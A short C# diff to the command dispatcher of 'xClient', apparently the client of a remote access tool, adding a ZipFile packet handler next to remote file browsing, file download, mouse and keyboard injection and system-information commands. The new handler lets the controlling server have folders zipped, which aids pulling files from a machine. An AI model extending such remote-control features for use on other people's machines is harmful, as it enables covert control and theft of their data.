@@ -70,6 +70,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.Drives),
                 typeof (Core.Packets.ServerPackets.Directory),
                 typeof (Core.Packets.ServerPackets.DownloadFile),
+                typeof (Core.Packets.ServerPackets.ZipFile),
                 typeof (Core.Packets.ServerPackets.MouseClick),
                 typeof (Core.Packets.ServerPackets.KeyPress),
                 typeof (Core.Packets.ServerPackets.GetSystemInfo),
@@ -285,13 +286,17 @@ namespace xClient
             {
                 CommandHandler.HandleDirectory((Core.Packets.ServerPackets.Directory) packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.DownloadFile))
+            else if (type == typeof(Core.Packets.ServerPackets.DownloadFile))
             {
-                CommandHandler.HandleDownloadFile((Core.Packets.ServerPackets.DownloadFile) packet, client);
+                CommandHandler.HandleDownloadFile((Core.Packets.ServerPackets.DownloadFile)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.MouseClick))
+            else if (type == typeof(Core.Packets.ServerPackets.ZipFile))
             {
-                CommandHandler.HandleMouseClick((Core.Packets.ServerPackets.MouseClick) packet, client);
+                CommandHandler.HandleZipFolder((Core.Packets.ServerPackets.ZipFile)packet, client);
+            }
+            else if (type == typeof(Core.Packets.ServerPackets.MouseClick))
+            {
+                CommandHandler.HandleMouseClick((Core.Packets.ServerPackets.MouseClick)packet, client);
             }
             else if (type == typeof(Core.Packets.ServerPackets.KeyPress))
             {
